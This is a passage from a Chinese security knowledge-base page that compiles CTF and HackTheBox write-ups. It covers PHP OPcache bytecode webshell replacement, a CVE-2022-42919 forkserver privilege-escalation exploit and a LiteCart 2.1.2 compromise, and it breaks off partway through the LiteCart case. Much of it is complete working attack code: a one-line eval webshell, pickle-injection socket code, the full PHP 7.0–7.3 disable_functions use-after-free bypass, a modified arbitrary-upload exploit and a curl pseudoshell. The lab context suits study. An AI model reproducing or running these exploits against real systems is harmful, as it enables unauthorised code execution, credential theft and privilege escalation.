---
title: PHP 运行时、缓存与执行边界
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/php-runtime/
categories:
- Web安全
- 运行时机制
tags:
- 知识库
- PHP
- OPcache
- CVE-2022-42919
- disable_functions
- UDF
- PAM
- 后门分析
- Ruby
- sudo
description: OPcache 缓存、disable_functions 与开发版后门位于不同层次。本章把原实验中的构建信息、字节码文件、运行时限制和本地提权放在一起对照。先核对版本、扩展与进程身份，再读对应的载荷。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

OPcache 缓存、disable_functions 与开发版后门位于不同层次。本章把原实验中的构建信息、字节码文件、运行时限制和本地提权放在一起对照。先核对版本、扩展与进程身份，再读对应的载荷。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/php-runtime/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

php_again 的 system_id 和 Zend Extension 差异决定缓存能否被目标加载，编译参数属于证据的一部分。

Compromised 中的 PHP 限制、MySQL UDF 和 PAM 后门是不同阶段，原记录分别给出验证结果。

Knife 的开发版异常行为与 Ruby sudo 权限有各自的触发点。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [OPcache 字节码与 forkserver 套接字](#case-2023-chunqiubei-spring-php-again) | 2023-chunqiubei-spring-php-again | PHP、OPcache、CVE-2022-42919 |
| [上传、运行时限制与 PAM 后门](#case-compromised) | compromised | PHP、disable_functions、UDF、PAM |
| [开发版后门与 Ruby sudo](#case-knife) | knife | PHP、后门分析、Ruby、sudo |

<a id="case-2023-chunqiubei-spring-php-again"></a>

## OPcache 字节码与 forkserver 套接字

这条链依赖与目标匹配的 PHP 构建参数和 OPcache system_id。原记录保留 Zend Extension 差异、缓存替换过程，以及 CVE-2022-42919 的本地提权分支。

<p class="kb-provenance">来源 2023-chunqiubei-spring-php-again · 原记录 2023-07-01 · 15 个代码块 · 24 处图片引用</p>

<details class="kb-evidence" id="record-2023-chunqiubei-spring-php-again">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start 2023-chunqiubei-spring-php-again -->

#### 介绍

同样是在ichunqiu CTF大本营刷题的时候碰到一道高质量的web题，也比较有实战价值，比赛中算是web里耗时较长的的。网上已经有一些公开的writeup，但是为了加深理解记忆，故记录一篇blog。

其中包括一些网上没公开的一些CVE-2022-42919 LPE exp的利用细节及PHP 8.2.2 OPcache Binary Webshell手工利用方法。

 - 复现链接: [2023年春秋杯网络安全联赛春季赛 web php_again](https://www.ichunqiu.com/battalion?t=1&r=72366)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again.png)



#### PHP 8.2.2 OPcache Binary Webshell
#### 前置知识

 - php OPcache Binary Webshell 具体原理其请参考英文原出处[Binary Webshell Through OPcache in PHP 7](https://www.gosecure.net/blog/2016/04/27/binary-webshell-through-opcache-in-php-7/)

 - php OPcache Binary Webshell检测请参考[Detecting Hidden Backdoors in PHP OPcache](https://www.gosecure.net/blog/2016/05/26/detecting-hidden-backdoors-in-php-opcache/)

 - [Abusing PHP 7’s OPcache to Spawn Webshells - slides](https://docs.google.com/presentation/d/18y60Xy0eVeUnBXIH_t3ikfly_uyYbtfI6zAuKCHtlac/edit?pli=1#slide=id.p)

 - [Abusing PHP 7’s OPcache to Spawn Webshells (Ian Bouchard) - youtube](https://www.youtube.com/watch?v=yLpsIWh7rvU)

 - [PHP7 OPcache Override 自动化利用工具](https://github.com/GoSecure/php7-opcache-override)

大概原理就是伪造替换原来合法PHP编译PHP脚本生成的字节码为webshell php脚本编译生成的恶意字节码

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again1.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again2.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again3.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again4.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again5.png)

利用方法：

1. 弄清楚受害者使用的是32位还是64位操作系统
2. 找到受害者的system ID
3. 在本地生成缓存文件
4. 将缓存文件中的system ID替换为受害者的system ID
5. 用你的文件覆盖受害者的缓存文件。
6. get a shell。

#### 目标php环境分析

``` bash
case 00:
    phpinfo();
    break;
case 73:
    exec('zip -r /tmp/www.zip *');
    readfile('/tmp/www.zip');
    break;
case 7:
    var_dump(scandir('/var/www/html/'));
    break;
case 1365:
    file_put_contents('/tmp/tmp.zip',base64_decode($_POST['data']));
    break;
case 777777:
    exec('cd /tmp && unzip -o tmp.zip');
    break;
```

5个功能:

 - phpinfo信息
 - 压缩 /var/www/html目录到 /tmp/www.zip，可以读取 /tmp/www.zip
 - 查看当前目录下的文件
 - 上传文件 到 /tmp/tmp.zip
 - 覆盖解压 /tmp/tmp.zip

查看phpinfo()

``` bash
PHP Version 8.2.2

PHP Extension 	20220829
Zend Extension 	420220929
Zend Extension Build 	API420220929,NTS
PHP Extension Build 	API20220829,NTS
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again6.png)

开启了时间戳校验，所以之后需要获取文件创建时间和system_id

拉取php8.2.2源码，在本地(Ubuntu 18.04.6 LTS)复刻编译和目标相同的php环境

``` bash
cd /usr/local
wget https://www.php.net/distributions/php-8.2.2.tar.gz
tar -zxvf php-8.2.2.tar.gz && cd php-8.2.2
```

先看下php8.2.2源码的变化

 - 校验文件的位如果不通过就删除了

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again7.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again8.png)

继续跟下去

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again9.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again10.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again11.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again12.png)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again13.png)

编译安装php8.2.2

在题目的phpinfo信息中可以看到， Zend Extension的值是420020929，而正常拉下来的包都是 420020829.这里可能就是出题人故意改的，所以我们也需要改一下再编译。

打开 /usr/local/php-8.2.2/Zend/zend_extensions.h 文件，将其由原来的829改成929

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again14.png)

之后再进行编译安装

``` bash
apt-get install build-essential autoconf automake libtool libsqlite3-dev pkg-config libjpeg-dev libpng-dev libxml2-dev libbz2-dev libcurl4-gnutls-dev libssl-dev libffi-dev libwebp-dev libonig-dev libzip-dev

./configure --prefix=/usr/local/php --sysconfdir=/etc/php/8.2 --with-openssl --with-zlib --with-bz2 --with-curl --enable-bcmath --enable-gd --with-webp --with-jpeg --with-mhash --enable-mbstring --with-imap-ssl --with-mysqli --enable-exif --with-ffi --with-zip --enable-sockets --with-pcre-jit --enable-fpm --with-pdo-mysql --enable-pcntl

make && make install
cd /usr/bin
ln -s /usr/local/php/bin/php php8.2
cp /usr/local/php-8.2.2/php.ini-development /usr/local/php/lib/php.ini
cp /etc/php/8.2/php-fpm.conf.default /etc/php/8.2/php-fpm.conf
cp /etc/php/8.2/php-fpm.d/www.conf.default /etc/php/8.2/php-fpm.d/www.conf
```

打开 php.ini文件 ，开启opcache

``` bash
zend_extension = opcache
opcache.enable=1
opcache.validate_timestamps=1
opcache.consistency_checks=1
opcache.file_cache=/tmp
```

进入 /var/www/html，写入一句话木马，然后开启服务器

``` bash
root@fdvoid0:/var/www/html# cat index.php
<?=eval($_POST[1]);phpinfo();?>
root@fdvoid0:/var/www/html# php8.2 -S 0.0.0.0:8888
[Mon Jul  3 22:19:20 2023] PHP 8.2.2 Development Server (http://0.0.0.0:8888) started
```

访问之后便会在 /tmp目录下生成缓存文件,这就是正确的 system_id

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again15.png)

``` bash
root@fdvoid0:/mnt/d/1.online-ctfs/ichunqiu/2023-chunqiubei-spring/php_again# ls /tmp/
246104dd1c75c908e3152fa39e48dfb5
root@fdvoid0:/mnt/d/1.online-ctfs/ichunqiu/2023-chunqiubei-spring/php_again# cp /tmp/246104dd1c75c908e3152fa39e48dfb5/var/www/html/index.php.bin .
```

用功能二获取压缩包，压缩包中存在文件的创建时间

``` bash
curl http://eci-2ze1liq7ayfbjvmgeu18.cloudeci1.ichunqiu.com/?action=73 -o www.zip
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again16.png)

``` bash
2023年7月3日，20:06:15
```

使用在线工具[时间戳转换](https://tool.lu/timestamp/)转化为时间戳

``` bash
1688385975
```

用101 editor打开index.php.bin，然后确定时间戳的位置，修改时间戳

``` bash
64A2B9B7 ---> B7 B9 A2 64
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again17.png)

使用python脚本上传并解压文件

``` bash
import base64
import requests

import zipfile

url = "http://eci-2ze1liq7ayfbjvmgeu18.cloudeci1.ichunqiu.com/?action="
file_to_compress = 'index.php.bin'
zip_file_path = 'index.zip'
with zipfile.ZipFile(zip_file_path, 'w') as my_zip:
    my_zip.write(
        file_to_compress,
        '246104dd1c75c908e3152fa39e48dfb5/var/www/html/index.php.bin')

f = open(r"D:\1.online-ctfs\ichunqiu\2023-chunqiubei-spring\php_again\index.zip", "rb")
f = f.read()
f = base64.b64encode(f)
data = {"data": f}
url1 = url + "1365"
res = requests.post(url=url1, data=data)
#第二步 解压文件
url2 = url + "777777"
res = requests.get(url=url2)
```

再次访问时，我们已经拿到shell了

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again18.png)

#### Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 LPE

flag在根目录下没权限访问，根目录下还有一个/py_server.py文件

``` bash
import multiprocessing
import time


def foo():
    import traceback
    traceback.format_exc()
    print('Hello Ctfer')


if __name__ == '__main__':
    multiprocessing.freeze_support()
    multiprocessing.set_start_method("forkserver")
    p = multiprocessing.Pool()
    p1 = multiprocessing.Process(target=foo)
    p1.start()
    time.sleep(60*60*24)
```

看到以下两行，很容易想到python的一个multiprocessing forkserver提权漏洞

``` bash
multiprocessing.freeze_support()
multiprocessing.set_start_method("forkserver")
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again22.png)

 - 漏洞原始出处[Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 #97514](https://github.com/python/cpython/issues/97514)

看下漏洞的描述意思是起forkserver的时候我们将pick代码注入进去就能直接执行任意命令。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again19.png)

漏洞代码定位[cpython/Lib/multiprocessing/connection.py](https://github.com/python/cpython/blob/1699128c4891da3bbe23553d709261d88855b93f/Lib/multiprocessing/connection.py#L79-L80)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again21.png)

这里给了个案例，猜测跟那个pid有关，需要套接字注入到套接字文件

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again20.png)

pid就是套接字的id直接传值就行了，很容易构造exp

``` bash
import socket
import pickle
import os
import array

class Person():
    def __reduce__(self):
        command=r"cat /flag>/tmp/pwned"
        return (os.system,(command,))

p=Person()
opcode=pickle.dumps(p)
print(opcode)
f = open("exp.data","wb")
f.write(opcode)
f.close()
# 定义抽象命名空间套接字路径 没ss
# socket_path = "\0"+os.popen("ss -lx | grep '@'|awk '{print $5}'").read().replace("@","").strip()
socket_path = "\0listener-51-0"
print(socket_path)
def sendfds(sock, fds):
    '''Send an array of fds over an AF_UNIX socket.'''

# 创建套接字
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
# 连接到服务器
sock.connect(socket_path)
# 准备发送的数据
data = opcode
def send_fds(sock, msg, fds):
    return sock.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", fds))])

file = open("exp.data",'rb')
fd = file.fileno()
parent_r, child_w = os.pipe()
fds = [fd,child_w,fd,fd]
msg = bytes([len(fds) % 256])
send_fds(sock,msg,fds)
# 关闭套接字
sock.close()
file.close()
```

运行exp获取flag

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/php_again23.png)

#### 参考链接

 - [4.[春秋杯 2023]php_again](https://www.cnblogs.com/cyyyyi/p/17500269.html)
 - [5 php_again](https://mp.weixin.qq.com/s/uk7aBZcTuXd4bNiXCDSo0A)
 - [Binary Webshell Through OPcache in PHP 7](https://www.gosecure.net/blog/2016/04/27/binary-webshell-through-opcache-in-php-7/)
 - [PHP OPcache Override](https://github.com/GoSecure/php7-opcache-override)
 - [Linux specific local privilege escalation via the multiprocessing forkserver start method CVE-2022-42919 #97514](https://github.com/python/cpython/issues/97514)
 - [Detecting Hidden Backdoors in PHP OPcache](https://www.gosecure.net/blog/2016/05/26/detecting-hidden-backdoors-in-php-opcache/)
 - [Abusing PHP 7’s OPcache to Spawn Webshells - slides](https://docs.google.com/presentation/d/18y60Xy0eVeUnBXIH_t3ikfly_uyYbtfI6zAuKCHtlac/edit?pli=1#slide=id.p)
 - [Abusing PHP 7’s OPcache to Spawn Webshells (Ian Bouchard) - youtube](https://www.youtube.com/watch?v=yLpsIWh7rvU)


<!-- kb:end 2023-chunqiubei-spring-php-again -->

</details>

<a id="case-compromised"></a>

## 上传、运行时限制与 PAM 后门

LiteCart 上传后的执行受 disable_functions 限制。原记录保留绕过环境、MySQL UDF 和 pam_unix.so 的逆向证据，区分应用入口与已有后门线索。

<p class="kb-provenance">来源 compromised · 原记录 2020-09-16 · 36 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-compromised">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start compromised -->

#### introduce

OS: Linux
Difficulty: Hard
Points:	40
Release:	12 Sep 2020
IP:	10.10.10.207

User Blood xct	00 days, 03 hours, 35 mins, 20 seconds.
Root Blood xct	00 days, 03 hours, 34 mins, 56 seconds.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb92.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
root@kali:~/hackthebox/machine/compromised# nmap -sV -v -p- --min-rate=10000 10.10.10.207
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

enumerate port 80 by looking at files/directories:

``` bash
root@kali:~/ffuf# ./ffuf -c -u http://10.10.10.207/FUZZ -w /usr/share/wordlists/dirb/common.txt
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
backup                  [Status: 301, Size: 313, Words: 20, Lines: 10]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
shop                    [Status: 301, Size: 311, Words: 20, Lines: 10]
```

we find some interesting directories/files, but the important one is the backup directory,
so visit the URL http://10.10.10.207/backup/ and find out there is a file called a.tar.gz.

download and extract backup file:

``` bash
wget http://10.10.10.207/backup/a.tar.gz
tar -xvf a.tar.gz
```

sort the contents by modification date:

``` bash
find . -printf "%T@ %Tc %p\n" | sort -n
```

look at latest modified files.
look at ./admin/login.php and find this line:

``` bash
//file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
```

#### get shell

look whats in there:

``` bash
root@kali:~/hackthebox/machine/compromised# curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt
User: admin Passwd: theNextGenSt0r3!~
```

got creds:

``` bash
admin:theNextGenSt0r3!~
```

go to 

``` bash
http://10.10.10.207/shop/admin/
```

and login with the creds
see the version at the bottom left
``` bash
LiteCart 2.1.2
```
look for exploit with searchsploit:

``` bash
root@kali:~/hackthebox/machine/compromised# searchsploit LiteCart
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upload                                                 | php/webapps/45267.py
--------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
root@kali:~/hackthebox/machine/compromised# searchsploit -m php/webapps/45267.py
  Exploit: LiteCart 2.1.2 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/45267
     Path: /usr/share/exploitdb/exploits/php/webapps/45267.py
File Type: ASCII text, with CRLF line terminators

Copied to: /root/hackthebox/machine/compromised/45267.py
```

run the exploit:

``` bash
python 45267.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin
```

something went wrong, lets look at phpinfo,
edit the exploit from this:

``` bash
files = {
        'vqmod': (rand + ".php", "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
```

to this:

``` bash
files = {
        'vqmod': (rand + ".php", "<?php phpinfo(); ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
```

also, remove this at line 72, so we dont get the full html output of phpinfo in our terminal:

``` bash
print r.content
```
run the exploit again, and we get an url to the phpinfo

``` bash
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/4YQVJ.php?c=id
```

open the url in your browser and search for "disable_functions".
in there we see the disabled functions "system" and "shell_exec" and more which are preventing us to run commands :(

disable_functions:

``` bash
system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
```

but there is a bypass:

 - [PHP-7.3-disable_functions-Bypass](https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html)

so lets use this to get RCE.
first create the bypass.php file: (notice the change of the pwn function call)

``` bash
<?php

# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
# released as of 04/10/2019, specifically:
#
# PHP 7.0 - 7.0.33
# PHP 7.1 - 7.1.31
# PHP 7.2 - 7.2.23
# PHP 7.3 - 7.3.10
#
# Author: https://github.com/mm0r1

pwn($_REQUEST['c']);

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;

        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}
```

edit the 45267.py to this:

``` bash
#Exploit Title: LiteCart 2.1.2 - Arbitrary File Upload
# Date: 2018-08-27
# Exploit Author: Haboob Team
# Software Link: https://www.litecart.net/downloading?version=2.1.2
# Version: 2.1.2
# CVE : CVE-2018-12256

# 1. Description
# admin/vqmods.app/vqmods.inc.php in LiteCart 2.1.2 allows remote authenticated attackers 
# to upload a malicious file (resulting in remote code execution) by using the text/xml 
# or application/xml Content-Type in a public_html/admin/?app=vqmods&doc=vqmods request.
 
# 2. Proof of Concept
 
#!/usr/bin/env python
import mechanize
import cookielib
import urllib2
import requests
import sys
import argparse
import random
import string
parser = argparse.ArgumentParser(description='LiteCart')
parser.add_argument('-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
args = parser.parse_args()
if(not args.u or not args.t or not args.p):
    sys.exit("-h for help")
url = args.t
user = args.u
password = args.p

br = mechanize.Browser()
cookiejar = cookielib.LWPCookieJar()
br.set_cookiejar( cookiejar )
br.set_handle_equiv( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
response = br.open(url)
br.select_form(name="login_form")
br["username"] = user
br["password"] = password
res = br.submit()
response = br.open(url + "?app=vqmods&doc=vqmods")
one=""
for form in br.forms():
    one= str(form).split("(")
    one= one[1].split("=")
    one= one[1].split(")")
    one = one[0]
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies:
    cookie_dict[c.name] = c.value
bypass = open('bypass.php', 'r').read()

files = {
        'vqmod': ("mybypass.php", bypass, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
r = requests.get(url + "../vqmod/xml/mybypass.php?c=id")
if r.status_code == 200:
    print "Shell => " + url + "../vqmod/xml/mybypass.php"
else:
    print "Sorry something went wrong"
```

run the script again and we get the link to the code execution:

``` bash
root@kali:~/hackthebox/machine/compromised# python exp.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/mybypass.php
```

success:

``` bash
root@kali:~/hackthebox/machine/compromised# curl http://10.10.10.207/shop/vqmod/xml/mybypass.php?c=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

alright this works, lets create a pseudoshell quick called pshell.sh:

``` bash
#!/bin/bash

echo "x for exit"
input=""
while [ "$input" != "x" ]  
do
    echo -n "> "
    read input
    curl -XPOST http://10.10.10.207/shop/vqmod/xml/mybypass.php --data-urlencode "c=$input"
done
```

change permissions and run

``` bash
root@kali:~/hackthebox/machine/compromised# chmod 777 pshell.sh
root@kali:~/hackthebox/machine/compromised# ./pshell.sh
x for exit
> ls
4YQVJ.php
KJUAJ.php
OQZNZ.php
index.html
mybypass.php
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
> whoami
www-data
> pwd
/var/www/html/shop/vqmod/xml
```

got a database credential

``` bash
> cat /var/www/html/shop/includes/config.inc.php

define('DB_TYPE', 'mysql');
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'changethis');
define('DB_DATABASE', 'ecom');

// Password Encryption Salt
  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
```

what we can also find out, is that mysql has shell!

``` bash
> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
